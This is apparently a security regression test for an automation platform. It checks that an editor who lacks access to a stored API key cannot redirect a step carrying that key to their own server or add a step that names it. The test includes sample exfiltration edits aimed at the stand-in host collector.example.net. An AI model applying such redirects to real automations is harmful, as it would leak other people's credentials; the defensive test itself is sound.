// The attack (lead, 12 Nov): Olivia publishes a Space Automation whose HTTP step sends #Notely in a header to api.notely.example. A person (Tess) may edit the Automation but cannot see or use that Vault
// item. He changes the step's address to his own server, or adds a step that names the same key, and saves. The rule: a step may name a Vault item only if the person who publishes that version may
// use the item; a step that names a key and whose address, headers or body changed needs that right too. He can still change steps that carry no key. The key never reaches his server.
import test from "node:test";
import assert from "node:assert/strict";
import { bootCore } from "../../fixtures/seed/core/index.ts";
import { SECRET, boot, ok, promoted, seededDir, until } from "./automations-http-rig.ts";
import type { Seen } from "./automations-http-rig.ts";

const NOAH = "tok-usr_tess";

test("a person who cannot use a Vault key cannot point a step that sends it somewhere else", async () => {
  const seen: Seen[] = [];
  const d = await boot(seededDir(bootCore), seen, undefined, { [NOAH]: "usr_tess" });
  const as = async (who: string, p: string, body: unknown): Promise<{ status: number; text: string; data: Record<string, unknown> }> => {
    const r = await fetch(`${d.url}${p}`, { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${who}` }, body: JSON.stringify(body), signal: AbortSignal.timeout(8_000) });
    const text = await r.text();
    let data: Record<string, unknown> = {};
    try { data = ((JSON.parse(text) as { data?: Record<string, unknown> }).data) ?? {}; } catch { /* not JSON */ }
    return { status: r.status, text, data };
  };
  try {
    // Olivia's key in a Shared folder. Tess is a temporary person: she holds nothing on the Space, so she cannot see or use the key; she is given Edit on this one Automation
    const folder = await ok(d, "/v1/vault/folders/create", { name: "Keys", scope: "shared", idempotencyKey: "pub-folder" });
    const folderId = String((folder["folder"] as { id?: string }).id);
    const put = await ok(d, "/v1/vault/item/put", { folderId, name: "Acme", kind: "api_key", fields: [{ key: "api_key", value: SECRET }], idempotencyKey: "pub-acme" });
    const item = put["item"] as { id: string; handle: string };
    const peek = await as(NOAH, "/v1/vault/item/get", { itemId: item.id });
    assert.notEqual(peek.status, 200, `Tess cannot see the item: ${peek.text.slice(0, 200)}`);

    const keyStep = { id: "look", key: "http_request", title: "Read items", input: { method: "GET", url: "https://api.notely.example/v1/items", auth: { kind: "header", header: "X-Api-Key", handle: `${item.handle}.api_key` } } };
    const plainStep = { id: "note", key: "http_request", title: "Ping", input: { method: "GET", url: "https://status.example/ping" } };
    const id = await promoted(d, "pub", "Read items", [keyStep, plainStep]);
    // Tess may edit this Automation
    await ok(d, "/v1/access/share", { idempotencyKey: "pub-noah", resource: { type: "automation", id }, subject: { kind: "person", id: "usr_tess" }, level: "edit" });
    const current = async () => ((await ok(d, "/v1/automations/get", { automationId: id }))["automation"] as { definition: { triggers: unknown[]; nodes: Record<string, unknown>[] } }).definition;

    // 1. he points the key's step at his own server: refused, and the line says which step and what to do
    const def1 = await current();
    const moved = { ...def1, nodes: def1.nodes.map((n) => (n["id"] === "look" ? { ...n, input: { ...(n["input"] as object), url: "https://collector.example.net/take" } } : n)) };
    const r1 = await as(NOAH, "/v1/automations/update", { automationId: id, definition: moved });
    assert.notEqual(r1.status, 200, `the change must be refused: ${r1.text.slice(0, 300)}`);
    assert.match(r1.text, /Step 1 uses a key you cannot use/, r1.text);

    // 2. he adds a step of his own that names the same key: refused
    const def2 = await current();
    const added = { ...def2, nodes: [...def2.nodes, { id: "mine", key: "http_request", title: "Mine", input: { method: "GET", url: "https://collector.example.net/x", auth: { kind: "bearer", handle: item.handle } } }] };
    const r2 = await as(NOAH, "/v1/automations/update", { automationId: id, definition: added });
    assert.notEqual(r2.status, 200, r2.text.slice(0, 300));
    assert.match(r2.text, /Step 3 uses a key you cannot use/, r2.text);

    // 3. he changes the step that carries no key: allowed
    const def3 = await current();
    const fine = { ...def3, nodes: def3.nodes.map((n) => (n["id"] === "note" ? { ...n, title: "Ping status" } : n)) };
    const r3 = await as(NOAH, "/v1/automations/update", { automationId: id, definition: fine });
    assert.equal(r3.status, 200, r3.text.slice(0, 300));

    // the next Run sends the key only where Olivia put it
    const runId = String((await ok(d, "/v1/automations/run", { automationId: id, idempotencyKey: "pub-run" }))["runId"]);
    await until("the run", 12_000, async () => { const s = ((await ok(d, "/v1/runs/get", { runId }))["run"] as { status?: string }).status; return s === "succeeded" || s === "failed" ? s : undefined; });
    const withKey = seen.filter((s) => Object.values(s.headers).some((v) => v.includes(SECRET)));
    assert.ok(withKey.length > 0, `Olivia's step still runs: ${JSON.stringify(await ok(d, "/v1/runs/steps", { runId }))}`);
    assert.deepEqual([...new Set(withKey.map((s) => new URL(s.url).hostname))], ["api.notely.example"], "the key went only to the host Olivia chose");
  } finally { await d.stop(); }
});
